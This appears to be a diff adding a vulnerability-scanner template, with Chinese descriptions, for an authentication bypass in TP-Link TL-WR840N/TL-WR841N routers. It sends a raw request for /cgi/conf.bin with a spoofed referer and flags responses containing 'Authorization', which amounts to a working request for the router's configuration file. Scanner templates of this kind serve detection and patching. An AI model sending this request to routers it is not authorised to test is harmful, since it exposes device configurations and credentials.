@@ -1,0 +1,30 @@
+id: TP_Link-unauthorized_access-conf_bin
+info:
+  name: TP-Link TL-WR840N/TL-WR841N - Authenticaton Bypass
+  author:
+  - jim2g
+  description: |-
+    TP-Link TL-WR840N和TL-WR841N认证绕过漏洞
+    TP-Link TL-WR840N和TL-WR841N都是中国普联（TP-LINK）公司的无线路由器产品。
+
+    TP-Link TL-WR840N和TL-WR841N中存在安全漏洞，该漏洞源于程序未能正确的处理会话。攻击者可利用该漏洞执行任意操作。
+  severity: high
+  remediation: |
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    http://www.tp-link.com.cn/
+    临时修复方案：
+    根据漏洞具体详细进行漏洞修复方案描写
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,"Authorization")
+  raw:
+  - |
+    GET /cgi/conf.bin HTTP/1.1
+    Host: {{Hostname}}
+    refefer:{{Hostname}}/mainFrame.htm
+  req-condition: true
